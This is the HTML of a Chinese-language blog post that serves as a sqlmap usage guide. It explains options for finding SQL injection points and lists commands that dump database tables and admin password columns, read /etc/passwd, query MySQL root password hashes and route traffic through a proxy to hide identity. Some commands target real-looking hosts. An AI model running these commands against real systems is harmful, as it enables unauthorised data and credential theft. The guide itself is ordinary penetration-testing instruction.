@@ -1,0 +1,502 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='1.sqlmap中部分参数的备注 星号（ * ） 在注入的过程中，有时候会存在伪静态的页面，此时可以使用星号表示可能存在注入的部分
+sqlmap可以区分一个 URL 里面的参数来进行注入点测试，但在遇到了一些做了伪静态的网页就无法自动识别了。
+&amp;#39;/admin/1/&amp;#39; 类似于这种，SQLMap 便无法进行注入测试，但它实际上可能是这样的：&amp;#39;/admin.php?id=1&amp;#39; 它只是把参数隐藏在了 URL 中，对于这种网页，直接在参数后加上一个星号即可。
+sqlmap -u &amp;#34;www.baidu.com/admin/1*&amp;#34; –data 使用post方式提交的时候，就需要用到data参数了
+-p 当我们已经事先知道哪一个参数存在注入就可以直接使用-p来指定，从而减少运行时间
+–level 不同的level等级，sqlmap所采用的策略也不近相同，当–level的参数设定为2或者2以上的时候，sqlmap会尝试注入Cookie参数；当–level参数设定为3或者3以上的时候，会尝试对User-Angent，referer进行注入。
+–random-agent 使用该参数，sqlmap会自动的添加useragent参数，如果你知道它要求你用某一种agent，你也应当用user-agent选项自己指定所需的agent
+–technique 这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式。支持的探测方式如下：
+ B: Boolean-based blind SQL injection（布尔型注入） E: Error-based SQL injection（报错型注入） U: UNION query SQL injection（可联合查询注入） S: Stacked queries SQL injection（可多语句查询注入） T: Time-based blind SQL injection（基于时间延迟注入）  2.常用的指令 检查注入点 sqlmap -u &amp;#34;http://ooxx.com.tw/star_photo.php?artist_id=11&amp;#34; 列数据库信息 sqlmap -u &amp;#34;http://ooxx.com.tw/star_photo.php?artist_id=11&amp;#34; --dbs 指定库名列出所有表 sqlmap -u &amp;#34;http://ooxx.com.tw/star_photo.php?artist_id=11&amp;#34; -D xxxxx --tables 指定库名表名列出所有字段 sqlmap -u &amp;#34;http://ooxx.'><title>Net—sqlmap 使用指南</title>
+
+<link rel='canonical' href='https://ac-lm.github.io/posts/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/netsqlmap-%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/'>
+
+<link rel="stylesheet" href="/scss/style.min.3e931a8cde4424572927d210b427021f6d16f455d841774a2844b22bf5e6a143.css"><meta property='og:title' content='Net—sqlmap 使用指南'>
+<meta property='og:description' content='1.sqlmap中部分参数的备注 星号（ * ） 在注入的过程中，有时候会存在伪静态的页面，此时可以使用星号表示可能存在注入的部分
+sqlmap可以区分一个 URL 里面的参数来进行注入点测试，但在遇到了一些做了伪静态的网页就无法自动识别了。
+&amp;#39;/admin/1/&amp;#39; 类似于这种，SQLMap 便无法进行注入测试，但它实际上可能是这样的：&amp;#39;/admin.php?id=1&amp;#39; 它只是把参数隐藏在了 URL 中，对于这种网页，直接在参数后加上一个星号即可。
+sqlmap -u &amp;#34;www.baidu.com/admin/1*&amp;#34; –data 使用post方式提交的时候，就需要用到data参数了
+-p 当我们已经事先知道哪一个参数存在注入就可以直接使用-p来指定，从而减少运行时间
+–level 不同的level等级，sqlmap所采用的策略也不近相同，当–level的参数设定为2或者2以上的时候，sqlmap会尝试注入Cookie参数；当–level参数设定为3或者3以上的时候，会尝试对User-Angent，referer进行注入。
+–random-agent 使用该参数，sqlmap会自动的添加useragent参数，如果你知道它要求你用某一种agent，你也应当用user-agent选项自己指定所需的agent
+–technique 这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式。支持的探测方式如下：
+ B: Boolean-based blind SQL injection（布尔型注入） E: Error-based SQL injection（报错型注入） U: UNION query SQL injection（可联合查询注入） S: Stacked queries SQL injection（可多语句查询注入） T: Time-based blind SQL injection（基于时间延迟注入）  2.常用的指令 检查注入点 sqlmap -u &amp;#34;http://ooxx.com.tw/star_photo.php?artist_id=11&amp;#34; 列数据库信息 sqlmap -u &amp;#34;http://ooxx.com.tw/star_photo.php?artist_id=11&amp;#34; --dbs 指定库名列出所有表 sqlmap -u &amp;#34;http://ooxx.com.tw/star_photo.php?artist_id=11&amp;#34; -D xxxxx --tables 指定库名表名列出所有字段 sqlmap -u &amp;#34;http://ooxx.'>
+<meta property='og:url' content='https://ac-lm.github.io/posts/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/netsqlmap-%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/'>
+<meta property='og:site_name' content='AC-LM &#39;s blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Posts' /><meta property='article:tag' content='网络测试' /><meta property='article:published_time' content='2020-11-19T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2020-11-19T00:00:00&#43;00:00'/>
+<meta name="twitter:title" content="Net—sqlmap 使用指南">
+<meta name="twitter:description" content="1.sqlmap中部分参数的备注 星号（ * ） 在注入的过程中，有时候会存在伪静态的页面，此时可以使用星号表示可能存在注入的部分
+sqlmap可以区分一个 URL 里面的参数来进行注入点测试，但在遇到了一些做了伪静态的网页就无法自动识别了。
+&amp;#39;/admin/1/&amp;#39; 类似于这种，SQLMap 便无法进行注入测试，但它实际上可能是这样的：&amp;#39;/admin.php?id=1&amp;#39; 它只是把参数隐藏在了 URL 中，对于这种网页，直接在参数后加上一个星号即可。
+sqlmap -u &amp;#34;www.baidu.com/admin/1*&amp;#34; –data 使用post方式提交的时候，就需要用到data参数了
+-p 当我们已经事先知道哪一个参数存在注入就可以直接使用-p来指定，从而减少运行时间
+–level 不同的level等级，sqlmap所采用的策略也不近相同，当–level的参数设定为2或者2以上的时候，sqlmap会尝试注入Cookie参数；当–level参数设定为3或者3以上的时候，会尝试对User-Angent，referer进行注入。
+–random-agent 使用该参数，sqlmap会自动的添加useragent参数，如果你知道它要求你用某一种agent，你也应当用user-agent选项自己指定所需的agent
+–technique 这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式。支持的探测方式如下：
+ B: Boolean-based blind SQL injection（布尔型注入） E: Error-based SQL injection（报错型注入） U: UNION query SQL injection（可联合查询注入） S: Stacked queries SQL injection（可多语句查询注入） T: Time-based blind SQL injection（基于时间延迟注入）  2.常用的指令 检查注入点 sqlmap -u &amp;#34;http://ooxx.com.tw/star_photo.php?artist_id=11&amp;#34; 列数据库信息 sqlmap -u &amp;#34;http://ooxx.com.tw/star_photo.php?artist_id=11&amp;#34; --dbs 指定库名列出所有表 sqlmap -u &amp;#34;http://ooxx.com.tw/star_photo.php?artist_id=11&amp;#34; -D xxxxx --tables 指定库名表名列出所有字段 sqlmap -u &amp;#34;http://ooxx.">
+    <link rel="shortcut icon" href="/images/Infinite.png" />
+
+    </head>
+    <body class="
+    article-page 
+">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "dark");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex 
+    
+        on-phone--column extended
+    
+">
+    
+        <aside class="sidebar left-sidebar sticky">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header class="site-info">
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu0e5bb052ec3dba437a0eff173370edc8_1029_300x0_resize_box_3.png" width="300"
+                            height="273" class="site-logo" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <h1 class="site-name"><a href="/">AC-LM &#39;s blog</a></h1>
+        <h2 class="site-description">(￣O￣) . Z Z Z</h2></header>
+
+    <ol class="menu" id="main-menu" style='font-size: larger;'>
+        
+        
+        
+
+        <li id="menu-Back" >
+            <a href='#' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+                
+                <span>Back</span>
+            </a>
+        </li>
+        
+        
+
+        <li id="menu-Home" >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li id="menu-Posts" >
+            <a href='/posts' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                
+                <span>Posts</span>
+            </a>
+        </li>
+        
+
+        
+            <li id="dark-mode-toggle">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                <span>Dark Mode</span>
+            </li>
+        
+    </ol>
+</aside>
+
+    
+<main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+
+    <h2 class="article-title">
+        <a href="/posts/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/netsqlmap-%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/">Net—sqlmap 使用指南</a>
+    </h2>
+
+    
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Nov 19, 2020</time>
+            </div>
+        
+
+        
+    </footer>
+    
+</div>
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="1sqlmap中部分参数的备注">1.sqlmap中部分参数的备注</h2>
+<h3 id="星号--">星号（ * ）</h3>
+<p>在注入的过程中，有时候会存在伪静态的页面，此时可以使用星号表示可能存在注入的部分</p>
+<p>sqlmap可以区分一个 URL 里面的参数来进行注入点测试，但在遇到了一些做了伪静态的网页就无法自动识别了。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#e6db74">&#39;/admin/1/&#39;</span> 类似于这种，SQLMap 便无法进行注入测试，但它实际上可能是这样的：<span style="color:#e6db74">&#39;/admin.php?id=1&#39;</span>
+</code></pre></div><p>它只是把参数隐藏在了 URL 中，对于这种网页，直接在参数后加上一个星号即可。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;www.baidu.com/admin/1*&#34;</span>
+</code></pre></div><h3 id="data">–data</h3>
+<p>使用post方式提交的时候，就需要用到data参数了</p>
+<h3 id="-p">-p</h3>
+<p>当我们已经事先知道哪一个参数存在注入就可以直接使用-p来指定，从而减少运行时间</p>
+<h3 id="level">–level</h3>
+<p>不同的level等级，sqlmap所采用的策略也不近相同，当–level的参数设定为2或者2以上的时候，sqlmap会尝试注入Cookie参数；当–level参数设定为3或者3以上的时候，会尝试对User-Angent，referer进行注入。</p>
+<h3 id="random-agent">–random-agent</h3>
+<p>使用该参数，sqlmap会自动的添加useragent参数，如果你知道它要求你用某一种agent，你也应当用user-agent选项自己指定所需的agent</p>
+<h3 id="technique">–technique</h3>
+<p>这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式。支持的探测方式如下：</p>
+<ul>
+<li>B: Boolean-based blind SQL injection（布尔型注入）</li>
+<li>E: Error-based SQL injection（报错型注入）</li>
+<li>U: UNION query SQL injection（可联合查询注入）</li>
+<li>S: Stacked queries SQL injection（可多语句查询注入）</li>
+<li>T: Time-based blind SQL injection（基于时间延迟注入）</li>
+</ul>
+<h2 id="2常用的指令">2.常用的指令</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-lua" data-lang="lua"><span style="color:#960050;background-color:#1e0010">检查注入点</span>             sqlmap <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#34;http://ooxx.com.tw/star_photo.php?artist_id=11&#34;</span>
+<span style="color:#960050;background-color:#1e0010">列数据库信息</span>            sqlmap <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#34;http://ooxx.com.tw/star_photo.php?artist_id=11&#34;</span> <span style="color:#75715e">--dbs</span>
+<span style="color:#960050;background-color:#1e0010">指定库名列出所有表</span>       sqlmap <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#34;http://ooxx.com.tw/star_photo.php?artist_id=11&#34;</span> <span style="color:#f92672">-</span>D xxxxx <span style="color:#75715e">--tables</span>
+<span style="color:#960050;background-color:#1e0010">指定库名表名列出所有字段</span>  sqlmap <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#34;http://ooxx.com.tw/star_photo.php?artist_id=11&#34;</span> <span style="color:#f92672">-</span>D xxxxx <span style="color:#f92672">-</span>T admin <span style="color:#75715e">--columns</span>
+<span style="color:#960050;background-color:#1e0010">指定库名表名字段</span>dump出指定字段
+sqlmap <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#34;http://ooxx.com.tw/star_photo.php?artist_id=11&#34;</span> <span style="color:#f92672">-</span>D xxxxx <span style="color:#f92672">-</span>T admin <span style="color:#f92672">-</span>C ac,id,password <span style="color:#75715e">--dump    </span>
+                                                                               
+<span style="color:#960050;background-color:#1e0010">有几个参数可能会用到，直接加在最后面</span>
+<span style="color:#75715e">--cookie=COOKIE                            在需要登录的地方，需要登录后的cookie</span>
+<span style="color:#75715e">--proxy=&#34;http://127.0.0.1:8087&#34;            使用HTTP代理隐藏自己的身份，比如使用goagent等</span>
+<span style="color:#75715e">--sql-query=QUERY                          执行一个sql语句，不一定支持</span>
+
+<span style="color:#960050;background-color:#1e0010">命令解释（</span><span style="color:#f92672">-</span>v <span style="color:#960050;background-color:#1e0010">等级</span><span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">）</span>
+sqlmap <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#34;注入地址&#34;</span> <span style="color:#f92672">-</span>v <span style="color:#ae81ff">1</span> <span style="color:#75715e">--dbs              // 列举数据库   </span>
+sqlmap <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#34;注入地址&#34;</span> <span style="color:#f92672">-</span>v <span style="color:#ae81ff">1</span> <span style="color:#75715e">--current-db       // 当前数据库  </span>
+sqlmap <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#34;注入地址&#34;</span> <span style="color:#f92672">-</span>v <span style="color:#ae81ff">1</span> <span style="color:#75715e">--users            // 列数据库用户  </span>
+sqlmap <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#34;注入地址&#34;</span> <span style="color:#f92672">-</span>v <span style="color:#ae81ff">1</span> <span style="color:#75715e">--current-user     // 当前用户  </span>
+sqlmap <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#34;注入地址&#34;</span> <span style="color:#f92672">-</span>v <span style="color:#ae81ff">1</span> <span style="color:#75715e">--tables -D &#34;数据库&#34;                          // 列举数据库的表名  </span>
+sqlmap <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#34;注入地址&#34;</span> <span style="color:#f92672">-</span>v <span style="color:#ae81ff">1</span> <span style="color:#75715e">--columns -T &#34;表名&#34; -D &#34;数据库&#34;               // 获取表的列名  </span>
+sqlmap <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#34;注入地址&#34;</span> <span style="color:#f92672">-</span>v <span style="color:#ae81ff">1</span> <span style="color:#75715e">--dump -C &#34;字段,字段&#34; -T &#34;表名&#34; -D &#34;数据库&#34;   //获取表中的数据，包含列   </span>
+</code></pre></div><h2 id="3sqlmap参数使用实例">3.Sqlmap参数使用实例</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-rust" data-lang="rust"><span style="color:#75715e">//指定参数注入 
+</span><span style="color:#75715e"></span>   sqlmap <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#34;http://192.168.1.47/page.php?id=1&amp;cat=2&#34;</span> <span style="color:#f92672">-</span>v <span style="color:#ae81ff">1</span> <span style="color:#f92672">-</span>p <span style="color:#e6db74">&#34;id&#34;</span> 
+   sqlmap <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#34;http://192.168.1.47/page.php?id=1&amp;cat=2&#34;</span> <span style="color:#f92672">-</span>v <span style="color:#ae81ff">1</span> <span style="color:#f92672">-</span>p <span style="color:#e6db74">&#34;cat,id&#34;</span> 
+<span style="color:#75715e">//指定方法和post的数据 
+</span><span style="color:#75715e"></span>   sqlmap <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#34;http://192.168.1.47/page.php&#34;</span> <span style="color:#f92672">--</span>method <span style="color:#e6db74">&#34;POST&#34;</span> <span style="color:#f92672">--</span>data <span style="color:#e6db74">&#34;id=1&amp;cat=2&#34;</span> 
+<span style="color:#75715e">//指定cookie,可以注入一些需要登录的地址 
+</span><span style="color:#75715e"></span>   sqlmap <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#34;http://192.168.1.47/page.php?id=1&amp;cat=2&#34;</span> <span style="color:#f92672">--</span>cookie <span style="color:#e6db74">&#34;COOKIE_VALUE&#34;</span> 
+<span style="color:#75715e">//通过代理注入 
+</span><span style="color:#75715e"></span>   sqlmap <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#34;http://192.168.1.47/page.php?id=1&amp;cat=2&#34;</span> <span style="color:#f92672">--</span>proxy <span style="color:#e6db74">&#34;http://127.0.0.1:8118&#34;</span> 
+<span style="color:#75715e">//指定关键词，也可以不指定。程序会根据返回结果的hash自动判断 
+</span><span style="color:#75715e"></span>   sqlmap <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#34;http://192.168.1.47/page.php?id=1&amp;cat=2&#34;</span> <span style="color:#f92672">--</span>string <span style="color:#e6db74">&#34;STRING_ON_TRUE_PAGE&#34;</span> 
+<span style="color:#75715e">//显示指定的文件内容，一般用于php 
+</span><span style="color:#75715e"></span>   sqlmap <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#34;http://192.168.1.47/page.php?id=1&amp;cat=2&#34;</span> <span style="color:#f92672">--</span>file<span style="color:#f92672">-</span>read <span style="color:#f92672">/</span>etc<span style="color:#f92672">/</span>passwd 
+<span style="color:#75715e">//执行你自己的sql语句。 
+</span><span style="color:#75715e"></span>   sqlmap <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#34;http://192.168.1.47/page.php?id=1&amp;cat=2&#34;</span> <span style="color:#f92672">-</span>v <span style="color:#ae81ff">1</span> <span style="color:#f92672">--</span>sql<span style="color:#f92672">-</span>query<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;SELECT password FROM mysql.user WHERE user = &#39;root&#39; LIMIT 0, 1&#34;</span>     
+<span style="color:#75715e">//union注入 
+</span><span style="color:#75715e"></span>   sqlmap <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#34;http://192.168.1.47/page.php?id=1&amp;cat=2&#34;</span> <span style="color:#f92672">--</span><span style="color:#66d9ef">union</span><span style="color:#f92672">-</span>check 
+   sqlmap <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#34;http://192.168.1.47/page.php?id=1&amp;cat=2&#34;</span> <span style="color:#f92672">-</span>v <span style="color:#ae81ff">1</span> <span style="color:#f92672">--</span><span style="color:#66d9ef">union</span><span style="color:#f92672">-</span><span style="color:#66d9ef">use</span> <span style="color:#f92672">--</span>banner 
+<span style="color:#75715e">//保存注入过程到一个文件，还可以从文件恢复出注入过程，很方便，一大特色。你可以在注入的时候中断，有时间再继续。 
+</span><span style="color:#75715e"></span>   sqlmap <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#34;http://192.168.1.47/page.php?id=1&amp;cat=2&#34;</span> <span style="color:#f92672">-</span>v <span style="color:#ae81ff">1</span> <span style="color:#f92672">-</span>b <span style="color:#f92672">-</span>o <span style="color:#e6db74">&#34;sqlmap.log&#34;</span> 
+   sqlmap <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#34;http://192.168.1.47/page.php?id=1&amp;cat=2&#34;</span> <span style="color:#f92672">-</span>v <span style="color:#ae81ff">1</span> <span style="color:#f92672">--</span>banner <span style="color:#f92672">-</span>o <span style="color:#e6db74">&#34;sqlmap.log&#34;</span> <span style="color:#f92672">--</span>resume
+</code></pre></div>
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95/">网络测试</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    <aside class="related-contents--wrapper">
+    
+    
+        <h2 class="section-title">Related contents</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="">
+    <a href="/posts/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/netsqlmap-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Net—sqlmap 数据库渗透测试工具</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/posts/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/netnmap-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Net—Nmap 端口扫描工具</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/posts/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/netiperf-%E4%B8%8E-netperf-%E7%BD%91%E7%BB%9C%E6%80%A7%E8%83%BD%E6%B5%8B%E9%87%8F%E5%B7%A5%E5%85%B7/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Net—iperf 与 netperf 网络性能测量工具</h2>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
+    
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2022 AC-LM &#39;s blog
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.7.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                defer="false"
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
